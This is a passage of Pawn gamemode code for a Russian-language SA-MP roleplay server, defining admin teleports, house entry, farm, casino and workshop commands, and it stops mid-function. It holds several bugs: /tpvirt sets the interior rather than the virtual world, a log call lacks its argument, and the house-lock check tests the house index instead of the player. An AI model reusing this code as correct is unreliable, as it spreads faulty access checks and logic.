//#1
CMD:restoreaccess(playerid)
{
	if(PTEMP[playerid][pLogin] != 0) return SCM(playerid, COLOR_GREY, " Вы уже авторизованы");
	ShowPlayerDialogEx(playerid, 40, DIALOG_STYLE_LIST, "Восстановление доступа", "[Первый этап] Отправить код на эмейл\n[Второй этап] Ввести код и сбролсить пароли", "Выбор", "");
	printf("Игрок %s начал восстановление доступа к аккаунту", Name(playerid));
	return true;
}
CMD:serverbonus(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 10) return true;
	new que[2048];
	mysql_format(DATABASE, QUERY, sizeof(QUERY), "SELECT COLUMN_NAME,COLUMN_DEFAULT FROM INFORMATION_SCHEMA.columns WHERE `TABLE_name` = 'accounts' AND\
	`COLUMN_NAME` IN('pLevel', 'pBank', 'pCash', 'pDirectory', 'pCarLic', 'pFlyLic', 'pBoatLic', 'pFishLic', 'pGunLic', 'pGunSkills')");
	mysql_query(DATABASE, QUERY);
	new r = cache_num_rows();
	que = "Название\tЗначение при регистрации\n";
	if(r)
	{
		for(new i = r/3; i < (r/3)*2; i++)
		{
			new strin[128], col[32], def[64];
			cache_get_field_content(i,"COLUMN_NAME",col,DATABASE,sizeof(col));
			cache_get_field_content(i,"COLUMN_DEFAULT",def,DATABASE,sizeof(def));
			if(strcmp(col, "pLevel", false) == 0)
			{
			    if(strval(def) == 1) format(strin, sizeof(strin), "{FFFFFF}[0] Уровень\t{FF0000}[%s]\n",def);
			    else format(strin, sizeof(strin), "{FFFFFF}[0] Уровень\t{00FF00}[%s]\n",def);
			}
			else if(strcmp(col, "pBank", false) == 0)
			{
			    if(strval(def) == 0) format(strin, sizeof(strin), "{FFFFFF}[1] Деньги в банке\t{FF0000}[%s]\n",def);
				else format(strin, sizeof(strin), "{FFFFFF}[1] Деньги в банке\t{00FF00}[%s]\n",def);
			}
			else if(strcmp(col, "pCash", false) == 0)
			{
				if(strval(def) == 0) format(strin, sizeof(strin), "{FFFFFF}[2] Деньги на руках\t{FF0000}[%s]\n",def);
				else format(strin, sizeof(strin), "{FFFFFF}[2] Деньги на руках\t{00FF00}[%s]\n",def);
			}
			else if(strcmp(col, "pDirectory", false) == 0)
			{
				new defaults = strval(def);
				if(defaults == 0) strin = "{FFFFFF}[3] Телефонный справочник\t{FF0000}[Нет]\n";
				else strin = "{FFFFFF}[3] Телефонный справочник\t{00FF00}[Есть]\n";
			}
			else if(strcmp(col, "pCarLic", false) == 0)
			{
			    new defaults = strval(def);
				if(defaults == 0) strin = "{FFFFFF}[4] Лицензия на вождение\t{FF0000}[Нет]\n";
				else strin = "{FFFFFF}[4] Лицензия на вождение\t{00FF00}[Есть]\n";
			}
			else if(strcmp(col, "pFlyLic", false) == 0)
			{
			    new defaults = strval(def);
				if(defaults == 0) strin = "{FFFFFF}[5] Лицензия на полёты\t{FF0000}[Нет]\n";
				else strin = "{FFFFFF}[5] Лицензия на полёты\t{00FF00}[Есть]\n";
			}
			else if(strcmp(col, "pBoatLic", false) == 0)
			{
			    new defaults = strval(def);
				if(defaults == 0) strin = "{FFFFFF}[6] Лицензия на водный транспорт\t{FF0000}[Нет]\n";
				else strin = "{FFFFFF}[6] Лицензия на водный транспорт\t{00FF00}[Есть]\n";
			}
			else if(strcmp(col, "pFishLic", false) == 0)
			{
			    new defaults = strval(def);
				if(defaults == 0) strin = "{FFFFFF}[7] Лицензия на рыболовлю\t{FF0000}[Нет]\n";
				else strin = "{FFFFFF}[7] Лицензия на рыболовлю\t{00FF00}[Есть]\n";
			}
			else if(strcmp(col, "pGunLic", false) == 0)
			{
			    new defaults = strval(def);
				if(defaults == 0) strin = "{FFFFFF}[8] Лицензия на оружие\t{FF0000}[Нет]\n";
				else strin = "{FFFFFF}[8] Лицензия на оружие\t{00FF00}[Есть]\n";
			}
			else if(strcmp(col, "pGunSkills", false) == 0)
			{
	   			if(!strcmp(def, "0, 0, 0, 0, 0, 0", false)) strin = "{FFFFFF}[9] Навык владения оружием\t{FF0000}[Нет]\n";
				else strin = "{FFFFFF}[9] Навык владения оружием\t{00FF00}[Есть]\n";
			}
			
			strcat(que, strin);
  		}
	}
	ShowPlayerDialogEx(playerid, 5254, DIALOG_STYLE_TABLIST_HEADERS, "Бонусы сервера", que, "Выбор", "Отмена");
	printf("Администратор %s открыл окно бонусов сервера");
	return true;
}
CMD:tpcor(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7) return true;
	new Float:fx, Float:fy, Float:fz;
	if(sscanf(params, "fff",fx, fy, fz)) return SCM(playerid, -1, " Введите: /tpcor [x] [y] [z]");
	SetPlayerPos(playerid, fx, fy, fz);
	SCM(playerid, -1, " Вы были телепортированы");
	printf("Администратор %s телепортировался по координатам %f,%f,%f",Name(playerid), fx, fy, fz);
	return true;
}
CMD:tpint(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7) return true;
	if(sscanf(params, "i", params[0])) return SCM(playerid, -1, " Введите: /tpint [interior]");
	SetPlayerInterior(playerid, params[0]);
	SCM(playerid, -1, " Вы были телепортированы в другой интерьер");
	printf("Администратор %s установил себе интерьер №%i", Name(playerid), params[0]);
	return true;
}
CMD:tpvirt(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7) return true;
	if(sscanf(params, "i", params[0])) return SCM(playerid, -1, " Введите: /tpvirt [virtual world]");
	SetPlayerInterior(playerid, params[0]);
	SCM(playerid, -1, " Вы были телепортированы в другой виртуальный мир");
	printf("Администратор %s установил себе виртуальный мир №%i", Name(playerid), params[0]);
	return true;
}
CMD:grating(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	ShowPlayerDialogEx(playerid, 5693, DIALOG_STYLE_LIST, "Рейтинг", "[0] Банды\n[1] Игроки\n[2] История", "Выбрать", "Назад");
	return true;
}
CMD:enterg(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	{
		switch(GetPlayerVirtualWorld(playerid))
		{
		    case 0: MovePlayerToGarageFootOut(playerid); // зайти в гараж без машины с улицы
		    default: MovePlayerToGarageFootIn(playerid); // зайти в гараж без машины с дома
		}
	}
	else if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		MovePlayerToGarageCar(playerid); // Телепорт игрока вместе с машиной
	}
	printf("Игрок %s вошёл в гараж", Name(playerid));
	return true;
}
CMD:enter(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	for(new i = 1; i <= TotalHouse; i++)
	{
		if(!PlayerToPoint(3, playerid,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez])) continue;
		if(strcmp(HouseInfo[i][hOwner],"None",true) != 0) // Если дом куплен
		{
			if(PTEMP[playerid][pPHouseKey] == i || HouseInfo[i][hLock] == 0 || IsACop(i) || PTEMP[i][pAdmin]) // Если игрок владелец дома или дом открыт
			{
				SetPlayerInterior(playerid,HouseInfo[i][hInt]);
				SetPlayerVirtualWorld(playerid,i+50);
				SetPlayerPos(playerid,HouseInfo[i][hExitx],HouseInfo[i][hExity],HouseInfo[i][hExitz]);
				printf("Игрок %s вошёл в дом №%i", Name(playerid), i);
			}
			else // Если не владелец дома или дом закрыт
			{
				GameTextForPlayer(playerid, "~r~CLOSED", 5000, 1);
			}
		}
		else // Если дом зеленый
		{
			SetPlayerInterior(playerid,HouseInfo[i][hInt]);
			SetPlayerVirtualWorld(playerid,i+50);
			SetPlayerPos(playerid,HouseInfo[i][hExitx],HouseInfo[i][hExity],HouseInfo[i][hExitz]);
			printf("Игрок %s вошёл в дом №%i", Name(playerid), i);
		}
		printf("Игрок %s вошёл в дом №%i", Name(playerid), i);
		break;
	}
	
	return true;
}
CMD:lpanel(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0 || PTEMP[playerid][pLeader] == 0) return true;
	return ShowPlayerDialogEx(playerid, 1000, DIALOG_STYLE_LIST, "Панель лидера", "[0] Игроки в Offline\n[1] Понизить/повысить игрока в Offline\n[2] Уволить игрока в Offline", "Выбрать", "Назад");
}
CMD:boostinfo(playerid)
{
	if(booston == 0) return SCM(playerid,-1," Бонусы отключены");
	mysql_format(DATABASE,QUERY,256,"SELECT * FROM `boost` WHERE `Text` = 'BoostTime'");
	return mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",36,playerid,"");
}
CMD:tawercasino(playerid,params[])
{
	if(!GetPVarInt(playerid,"BoneStol_")) return SCM(playerid,COLOR_GREY," Вы не поставили ставку!");
	if(BoneInfo[GetPVarInt(playerid,"BoneStol")-1][GameStart] <= 0) return SCM(playerid,COLOR_GREY," В данный момент нельзя кинуть кости");
	if(GetPVarInt(playerid,"BoneStol_") > 1) return SCM(playerid,COLOR_GREY," Вы уже кидали кубики в этом раунде!");
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /tawercasino [очки]");
	new null = 0;
	SetPVarInt(playerid,"BoneStol_",params[0]);
	UpdateBone(GetPVarInt(playerid,"BoneStol")-1);
	foreach(i)
	{
		if(GetPVarInt(i,"BoneStol") == GetPVarInt(playerid,"BoneStol") && GetPVarInt(i,"BoneStol_") == 1) null++;
	}
	if(!null) BoneInfo[GetPVarInt(playerid,"BoneStol")-1][GameStart] = 4;
	return true;
}
CMD:taxigps(playerid, params[])
{
	if(!PTEMP[playerid][pLogin] || PTEMP[playerid][pJob] != 4) return SCM(playerid, COLOR_GREY, " Вы не таксист или не на службе");
	new null[7];
	foreach(i)
	{
		if(Works[i]) null[0]++;
		if(Prorab[i]) null[1]++;
		if(GetPVarInt(i,"farm_id") == 1) null[2]++;
		if(GetPVarInt(i,"farm_id") == 2) null[3]++;
		if(GetPVarInt(i,"farm_id") == 3) null[4]++;
		if(GetPVarInt(i,"farm_id") == 4) null[5]++;
		if(GetPVarInt(i,"farm_id") == 5) null[6]++;
	}
	format(string,sizeof(string),"{ffffff}[Грузчики] {33AA33} Прорабов %i Рабочих %i\n\
						{ffffff}[Ферма №0] {33AA33} Фермеров %i {FFFF00} Цена за куст %i$\n\
						{ffffff}[Ферма №1] {33AA33} Фермеров %i {FFFF00} Цена за куст %i$\n\
						{ffffff}[Ферма №2] {33AA33} Фермеров %i {FFFF00} Цена за куст %i$\n\
						{ffffff}[Ферма №3] {33AA33} Фермеров %i {FFFF00} Цена за куст %i$\n\
						{ffffff}[Ферма №4] {33AA33} Фермеров %i {FFFF00} Цена за куст %i$",
	null[1], null[0], null[2], FarmInfo[1][fZp], null[3], FarmInfo[2][fZp], null[4], FarmInfo[3][fZp], null[5], FarmInfo[4][fZp], null[6], FarmInfo[5][fZp]);
	return ShowPlayerDialogEx(playerid, 1344, DIALOG_STYLE_LIST, "Статистика",string, "GPS", "Закрыть");
}
CMD:farmstats(playerid, params[])
{
	if(PTEMP[playerid][pAdmin] < 4) return 1;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /farmstats [номер фермы]");
	if(params[0] < 0 || params[0] > 4) return SCM(playerid, COLOR_GREY, " Ошибка: Неверный номер фермы.");
	FarmStats(playerid,params[0]);
	return 1;
}
CMD:dice(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!PlayerToPoint(30.0,playerid,1130.7448,-1.4491,1000.6797)) return SCM(playerid, -1, " Вы должны находиться в казино!");
	if(sscanf(params, "ud", params[0],params[1])) return SCM(playerid, -1, " Введите: /dice [ID] [ставка]");
	if(params[1] < 100 || params[1] > 1000000) return SCM(playerid, -1, " Минимальная ставка 100$ максимальная 1 000 000$");
	if(ZapretDice[params[0]] == 1) return SCM(playerid, -1, " В данный момент игрок не может играть!");
	if(PTEMP[params[0]][pCash] < params[1]) return SCM(playerid, -1, " У этого игрока нет столько денег!");
	if(dicetime > gettime()) return SCM(playerid, -1, " В данный момент вы не можете играть!");
	if(!IsPlayerConnected(params[0])) return true;    if(!ProxDetectorS(6.0, playerid, params[0])) return true;
	if(params[0] == playerid) return true;
	format(YCMDstr, sizeof(YCMDstr), " Вы предложили %s бросить кости. Ставка: $%i",Name(params[0]),params[1]);
	SCM(playerid, 0x6495EDFF, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " %s предлагает бросить кости. Ставка: $%i",Name(playerid),params[1]);
	SCM(params[0], 0x6495EDFF, YCMDstr);
	SCM(params[0], -1, " Нажмите {48FC23}Y {FFFFFF}чтобы согласиться {FF0000}N {FFFFFF}для отказа");
	ZapretDice[playerid] = 1;
	KostiName[params[0]] = playerid;
	KostiMoney[params[0]] = params[1];
	DiceOffers[playerid] = params[0];
	return true;
}
CMD:farm(playerid, params[])
{
	if(PTEMP[playerid][pAdmin] < 4) return 1;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /farm [номер фермы]");
	if(params[0] < 0 || params[0] > 4) return SCM(playerid, -1, " Ошибка: Неверный номер фермы.");
	switch(params[0])
	{
	case 0:
		{
			if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
			{
				return SetVehiclePos(GetPlayerVehicleID(playerid),-376.9641,-1437.9998,25.7266);
			}
			else return SetPlayerPos(playerid,-376.9641,-1437.9998,25.7266);
		}
	case 1:
		{
			if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
			{
				return SetVehiclePos(GetPlayerVehicleID(playerid),-103.2208,-29.6182,3.1172);
			}
			else return SetPlayerPos(playerid,-103.2208,-29.6182,3.1172);
		}
	case 2:
		{
			if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
			{
				return SetVehiclePos(GetPlayerVehicleID(playerid),-1033.3143,-1166.2423,129.2188);
			}
			else return SetPlayerPos(playerid,-1033.3143,-1166.2423,129.2188);
		}
	case 3:
		{
			if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
			{
				return SetVehiclePos(GetPlayerVehicleID(playerid),-2.8795,88.8511,3.1172);
			}
			else return SetPlayerPos(playerid,-2.8795,88.8511,3.1172);
		}
	case 4:
		{
			if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
			{
				return SetVehiclePos(GetPlayerVehicleID(playerid),1904.1216,174.0404,37.1664);
			}
			else return SetPlayerPos(playerid,1904.1216,174.0404,37.1664);
		}
	}
	return true;
}
CMD:prodmenu(playerid, params[])
{
	if(!PTEMP[playerid][pLogin]) return true;
	if(PTEMP[playerid][pJob] != 5) return SCM(playerid,COLOR_GREY," Вы должны устроиться на работу развозчика продуктов");
	if(GetPlayerVehicleID(playerid) >= comptruck[0] && GetPlayerVehicleID(playerid) <= comptruck[1])
	{
		if(GetPVarInt(playerid,"rentcar_job") != GetPlayerVehicleID(playerid)) return SCM(playerid,COLOR_GREY," Это не ваш автомобиль!");
		return ShowPlayerDialogEx(playerid, 1322, DIALOG_STYLE_LIST, "Развозка продуктов", "Покупка зерна\nПродажа зерна\nПокупка урожая\nПродажа урожая", "Выбрать", "Отмена");
	}
	else if(GetPlayerVehicleID(playerid) >= comptruck[2] && GetPlayerVehicleID(playerid) <=  comptruck[3]) return ShowPlayerDialogEx(playerid, 1375, DIALOG_STYLE_LIST, "Развозка бензина", "Купить\nПродать\nМониторинг\nСтатистика\nВыбросить продукты", "Выбрать", "Отмена");
	else if(GetPlayerVehicleID(playerid) >= comptruck[4] && GetPlayerVehicleID(playerid) <=  comptruck[5]) return ShowPlayerDialogEx(playerid, 1375, DIALOG_STYLE_LIST, "Развозка продуктов", "Купить\nПродать\nМониторинг\nСтатистика\nВыбросить продукты", "Выбрать", "Отмена");
	else if(GetPlayerVehicleID(playerid) >= comptruck[6] && GetPlayerVehicleID(playerid) <=  comptruck[7]) return ShowPlayerDialogEx(playerid, 1375, DIALOG_STYLE_LIST, "Развозка продуктов", "Купить\nПродать\nМониторинг\nСтатистика\nВыбросить продукты", "Выбрать", "Отмена");
	else if(GetPlayerVehicleID(playerid) >= comptruck[8] && GetPlayerVehicleID(playerid) <=  comptruck[9]) return ShowPlayerDialogEx(playerid, 1375, DIALOG_STYLE_LIST, "Развозка продуктов", "Купить\nПродать\nМониторинг\nСтатистика\nВыбросить продукты", "Выбрать", "Отмена");
	return true;
}
CMD:funload(playerid, params[])
{
	if(!PTEMP[playerid][pLogin] || GetPVarInt(playerid,"farm_rank") < 2 || (GetPlayerVehicleID(playerid) != FarmInfo[GetPVarInt(playerid,"farm_id")][fSeed_Car][0] && GetPlayerVehicleID(playerid) != FarmInfo[GetPVarInt(playerid,"farm_id")][fSeed_Car][1])) return SCM(playerid,COLOR_GREY," [Ошибка] Вы не работаете на этой ферме / не в спец транспорте / не у фермы");
	if(!IsPlayerInRangeOfPoint(playerid,20.0,FarmInfo[GetPVarInt(playerid,"farm_id")][fMenu][0],FarmInfo[GetPVarInt(playerid,"farm_id")][fMenu][1],FarmInfo[GetPVarInt(playerid,"farm_id")][fMenu][2])) return SCM(playerid,COLOR_GREY," [Ошибка] Вы не работаете на этой ферме / не в спец транспорте / не у фермы");
	if(FarmInfo[GetPVarInt(playerid,"farm_id")][fProds] >= 10000) return SCM(playerid, COLOR_GREY," Склад полон!");
	if(!Farmcar_prods[GetPlayerVehicleID(playerid)]) return SCM(playerid,COLOR_GREY," В грузовике нет урожая");
	SetPVarInt(playerid,"farm_zp", GetPVarInt(playerid,"farm_zp") + Farmcar_prods[GetPlayerVehicleID(playerid)]*10/2);
	format(string, 32, "~b~count:~w~%i$",GetPVarInt(playerid,"farm_zp"));
	FarmStatPay[GetPVarInt(playerid,"farm_id")][3] += Farmcar_prods[GetPlayerVehicleID(playerid)];
	FarmStatDay[GetPVarInt(playerid,"farm_id")][3] += Farmcar_prods[GetPlayerVehicleID(playerid)];
	GameTextForPlayer(playerid, string, 3000, 1);
	FarmInfo[GetPVarInt(playerid,"farm_id")][fProds] += Farmcar_prods[GetPlayerVehicleID(playerid)];
	if(FarmInfo[GetPVarInt(playerid,"farm_id")][fProds] >= 10000) FarmInfo[GetPVarInt(playerid,"farm_id")][fProds] = 10000;
	Farmcar_prods[GetPlayerVehicleID(playerid)] = 0;
	format(string, sizeof(string), " {00AB06}Урожая в машине: 0 / 1000");
	SCM(playerid, COLOR_GREEN,string);
	//DeletePVar(playerid,"farm_status");
	return true;
}
CMD:fpanel(playerid, params[])
{
	if(!PTEMP[playerid][pLogin] || GetPVarInt(playerid,"farm_rank") < 3) return true;
	if(!PlayerToPoint(13, playerid,FarmInfo[GetPVarInt(playerid,"farm_id")][fMenu][0], FarmInfo[GetPVarInt(playerid,"farm_id")][fMenu][1], FarmInfo[GetPVarInt(playerid,"farm_id")][fMenu][2])) return SCM(playerid,-1,"{B8B8B8} Поблизости нет ферм");
	format(string,sizeof(string),"Установить цену зерна\nУстановить цену продуктов\nУстановить цену работы\nВвести вирты на счёт 'LandTax'\nВвести вирты на ферму\nВывести вирты с фермы\nСтатистика за прошлый час\nСтатистика за этот день");
	format(string,sizeof(string),"%s\nСменить продаваемый продукт\nНазначить Зама [1]\nНазначить Зама [2]\nНазначить Зама [3]\nНазначить Фермера [1]\nНазначить Фермера [2]\nНазначить Фермера [3]\nНазначить Фермера [4]\nНазначить Фермера [5]",string);
	return ShowPlayerDialogEx(playerid, 9600, DIALOG_STYLE_LIST, "Панель настроек",string, "Выбрать", "Отмена");
}
CMD:finfo(playerid, params[])
{
	if(!PTEMP[playerid][pLogin]) return true;
	for(new i = 0; i <= TOTALFARM; i++)
	{
		if(!PlayerToPoint(10, playerid,FarmInfo[i][fMenu][0], FarmInfo[i][fMenu][1], FarmInfo[i][fMenu][2])) continue;
		return FarmStats(playerid,i);
	}
	return SCM(playerid,-1,"{B8B8B8} Поблизости нет ферм");
}
CMD:ffixcar(playerid, params[])
{
	if(!PTEMP[playerid][pLogin] || GetPVarInt(playerid,"farm_rank") < 2) return true;
	SetVehicleToRespawn(FarmInfo[GetPVarInt(playerid,"farm_id")][fSeed_Car][0]);
	SetVehicleToRespawn(FarmInfo[GetPVarInt(playerid,"farm_id")][fSeed_Car][1]);
	SetVehicleToRespawn(FarmInfo[GetPVarInt(playerid,"farm_id")][fCombine]);
	if(Farmcar_pickup[FarmInfo[GetPVarInt(playerid,"farm_id")][fSeed_Car][0]] > 0) Delete3DTextLabel(Farmcar_text[FarmInfo[GetPVarInt(playerid,"farm_id")][fSeed_Car][0]]), DestroyDynamicPickup(Farmcar_pickup[FarmInfo[GetPVarInt(playerid,"farm_id")][fSeed_Car][0]]), Farmcar_pickup[FarmInfo[GetPVarInt(playerid,"farm_id")][fSeed_Car][0]] = 0;
	if(Farmcar_pickup[FarmInfo[GetPVarInt(playerid,"farm_id")][fSeed_Car][1]] > 0) Delete3DTextLabel(Farmcar_text[FarmInfo[GetPVarInt(playerid,"farm_id")][fSeed_Car][1]]), DestroyDynamicPickup(Farmcar_pickup[FarmInfo[GetPVarInt(playerid,"farm_id")][fSeed_Car][1]]), Farmcar_pickup[FarmInfo[GetPVarInt(playerid,"farm_id")][fSeed_Car][1]] = 0;
	return true;
}
CMD:finvite(playerid, params[])
{
	if(!PTEMP[playerid][pLogin] || GetPVarInt(playerid,"farm_rank") < 3) return true;
	if(!PlayerToPoint(10, playerid,FarmInfo[GetPVarInt(playerid,"farm_id")][fMenu][0], FarmInfo[GetPVarInt(playerid,"farm_id")][fMenu][1], FarmInfo[GetPVarInt(playerid,"farm_id")][fMenu][2])) return true;
	if(sscanf(params, "iii",params[0],params[1],params[2]))
	{
		SCM(playerid, -1, " Введите: /finvite [playerid (-1 для увольнения)] [тип] [место (от 1)]");
		return SCM(playerid,-1," Тип: 1 - заместитель | 2 - фермер");
	}
	if(params[0] != -1 && PTEMP[params[0]][pMember]) return SCM(playerid,COLOR_GREY," Этот человек состоит в организации!");
	switch(params[1])
	{
	case 1:
		{
			if(GetPVarInt(playerid,"farm_rank") < 4) return SCM(playerid,COLOR_GREY," Вы не можете нанимать заместителей");
			if(params[2] == 1)
			{
				if(params[0] == -1) return strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fDeputy_1],"None", 0, strlen("None"), 32);
				else strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fDeputy_1],PTEMP[params[0]][pName], 0, strlen(PTEMP[params[0]][pName]), 32);
			}
			else if(params[2] == 2)
			{
				if(params[0] == -1) return strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fDeputy_2],"None", 0, strlen("None"), 32);
				else strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fDeputy_2],PTEMP[params[0]][pName], 0, strlen(PTEMP[params[0]][pName]), 32);
			}
			else if(params[2] == 3)
			{
				if(params[0] == -1) return strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fDeputy_3],"None", 0, strlen("None"), 32);
				else strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fDeputy_3],PTEMP[params[0]][pName], 0, strlen(PTEMP[params[0]][pName]), 32);
			}
			else return SCM(playerid,COLOR_GREY," Неверное значение");
			SendMes(playerid,COLOR_BLUE," Вы приняли %s на должность заместителя", PTEMP[params[0]][pName]);
			printf("Игрок %s принял %і на должность заместителя фермы №%i", Name(playerid), Name(params[0]), GetPVarInt(playerid, "farm_id"));
		}
	case 2:
		{
			if(params[2] == 1)
			{
				if(params[0] == -1) return strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fFarmer_1],"None", 0, strlen("None"), 32);
				else strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fFarmer_1],PTEMP[params[0]][pName], 0, strlen(PTEMP[params[0]][pName]), 32);
			}
			else if(params[2] == 2)
			{
				if(params[0] == -1) return strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fFarmer_2],"None", 0, strlen("None"), 32);
				else strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fFarmer_2],PTEMP[params[0]][pName], 0, strlen(PTEMP[params[0]][pName]), 32);
			}
			else if(params[2] == 3)
			{
				if(params[0] == -1) return strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fFarmer_3],"None", 0, strlen("None"), 32);
				else strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fFarmer_3],PTEMP[params[0]][pName], 0, strlen(PTEMP[params[0]][pName]), 32);
			}
			else if(params[2] == 4)
			{
				if(params[0] == -1) return strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fFarmer_4],"None", 0, strlen("None"), 32);
				else strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fFarmer_4],PTEMP[params[0]][pName], 0, strlen(PTEMP[params[0]][pName]), 32);
			}
			else if(params[2] == 5)
			{
				if(params[0] == -1) return strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fFarmer_5],"None", 0, strlen("None"), 32);
				else strmid(FarmInfo[GetPVarInt(playerid,"farm_id")][fFarmer_5],PTEMP[params[0]][pName], 0, strlen(PTEMP[params[0]][pName]), 32);
			}
			else return SCM(playerid,COLOR_GREY," Неверное значение");
			SendMes(playerid,COLOR_BLUE," Вы приняли %s на должность фермера", PTEMP[params[0]][pName]);
			printf("Игрок %s принял %і на должность фермера фермы №%i", Name(playerid), Name(params[0]), GetPVarInt(playerid, "farm_id"));
		}
	}
	return true;
}
CMD:gmap(playerid, params[])
{
    ClearTotalGz();
    for(new y = 0; y < sizeof(GZInfo); y++)
	{
	    if(GZInfo[y][gFrakVlad] == 12) TotalGzB++;
	    if(GZInfo[y][gFrakVlad] == 13) TotalGzV++;
	    if(GZInfo[y][gFrakVlad] == 15) TotalGzG++;
	    if(GZInfo[y][gFrakVlad] == 17) TotalGzA++;
	    if(GZInfo[y][gFrakVlad] == 18) TotalGzR++;
    }
	SendMes(playerid,0x6AB1FFAA," Количество территорий, контролируемых Rifa: %d",TotalGzR);
	SendMes(playerid,0x6AB1FFAA," Количество территорий, контролируемых Grove street: %d",TotalGzG);
	SendMes(playerid,0x6AB1FFAA," Количество территорий, контролируемых Ballas: %d",TotalGzB);
	SendMes(playerid,0x6AB1FFAA," Количество территорий, контролируемых Vagos: %d",TotalGzV);
	SendMes(playerid,0x6AB1FFAA," Количество территорий, контролируемых Aztec: %d",TotalGzA);
	return 1;
}
CMD:tpanel(playerid, params[])
{
	if(!PTEMP[playerid][pLogin] || !WGet(playerid)) return true;
	new i = GetPVarInt(playerid,"wShop");
	if(!PlayerToPoint(15, playerid,WorkshopInfo[i][wEntr][0],WorkshopInfo[i][wEntr][1],WorkshopInfo[i][wEntr][2]) && !PlayerToPoint(15, playerid,WorkshopInfo[i][wExit][0],WorkshopInfo[i][wExit][1],WorkshopInfo[i][wExit][2])) return SCM(playerid, -1, "{B8B8B8} Поблизости нет автомастерских");
	return ShowPlayerDialogEx(playerid, 9592, DIALOG_STYLE_LIST, "Панель управления","[1] Пополнить банк автомастерской\n[2] Пополнить 'LandTax' счёт\n[3] Снять деньги с банка\n[4] Установить стоимость 1 продукта\n[5] Установить зарплату рабочим\n[6] Нанять заместителя (1)\
	\n[7] Нанять заместителя (2)\n[8] Нанять заместителя (3)\n[9] Нанять механика (1)\n[10] Нанять механика (2)\n[11] Нанять механика (3)\n[12] Нанять механика (4)\n[13] Нанять механика (5)", "Выбрать", "Отмена");
}
CMD:tinfo(playerid, params[])
{
	if(!PTEMP[playerid][pLogin]) return true;
	for(new i = 1; i <= TOTALSHOPS; i++)
	{
		if(!PlayerToPoint(3, playerid,WorkshopInfo[i][wEntr][0x0], WorkshopInfo[i][wEntr][0x1], WorkshopInfo[i][wEntr][0x2])) continue;
		return WorkshopStats(playerid,i);
	}
	return SCM(playerid,-1,"{B8B8B8} Поблизости нет автомастерских");
}
CMD:tupdate(playerid, params[])
{
	if(!PTEMP[playerid][pLogin]) return true;
	if(!GetPVarInt(playerid,"Workshop")) return SCM(playerid,COLOR_GREY," [Ошибка] Функция недоступна");
	if(!PlayerToPoint(10, playerid,1067.3966,2128.3901,10.5110)) return SCM(playerid,COLOR_GREY, " Вы должны находиться в гараже автомастерской");
	if(GetPVarInt(playerid,"installation") != 0) return SCM(playerid,COLOR_GREY," Вы не установили деталь!");
	//if(!ProxDetectorS(8.0, playerid, GetPVarInt(playerid,"installation_")) return SCM(playerid, COLOR_GREY, "Человек не рядом с вами!");
	if(GetPVarInt(GetPVarInt(playerid,"installation_"),"InWorkshop") != GetPVarInt(playerid,"Workshop")) return SCM(playerid,COLOR_GREY,"Игрок не находится с вами в гараже!");
	return ShowDetals(playerid,GetPVarInt(playerid,"installation_"),GetPVarInt(playerid,"Workshop"));
}
CMD:endtune(playerid, params[])
{
	if(!PTEMP[playerid][pLogin]) return true;
	if(!GetPVarInt(playerid,"Workshop")) return SCM(playerid,COLOR_GREY," Вы не работаете в автомастерской!");
	if(!PlayerToPoint(10, playerid,1067.3966,2128.3901,10.5110)) return SCM(playerid,COLOR_GREY, " Вы должны находиться в гараже автомастерской");
	if(GetPVarInt(playerid,"installation") != 0) return SCM(playerid,COLOR_GREY," Вы не установили деталь!");
	if(!ProxDetectorS(8.0, playerid, GetPVarInt(playerid,"installation_"))) return SCM(playerid, COLOR_GREY, " Человек не рядом с вами!");
	if(!IsPlayerInAnyVehicle(GetPVarInt(playerid,"installation_"))) return SCM(playerid,COLOR_GREY," Игрок должен находиться в автомобиле");
	if(GetPVarInt(GetPVarInt(playerid,"installation_"),"InWorkshop") != GetPVarInt(playerid,"Workshop")) return SCM(playerid,COLOR_GREY," Игрок не находится в гараже!");
	if(!IsPlayerInAnyVehicle(playerid)) return SCM(playerid,-1," Вы должны находиться в автомобиле");
	SetPlayerVirtualWorld(playerid,0);
	SetPlayerVirtualWorld(GetPVarInt(playerid,"installation_"),0);
	SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),0);
